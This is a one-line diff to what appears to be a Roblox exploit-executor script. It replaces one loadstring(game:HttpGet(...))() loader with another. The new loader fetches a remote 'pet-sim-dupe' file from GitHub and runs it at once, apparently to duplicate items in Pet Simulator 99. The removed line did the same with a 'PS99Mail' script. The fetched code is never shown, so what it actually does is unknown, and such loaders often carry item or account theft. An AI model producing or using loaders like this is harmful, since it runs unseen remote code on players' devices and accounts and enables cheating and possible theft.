@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+loadstring(game:HttpGet("https://github.com/rouge3131/pet-sim-dupe/blob/main/roblox.txt.txt"))()
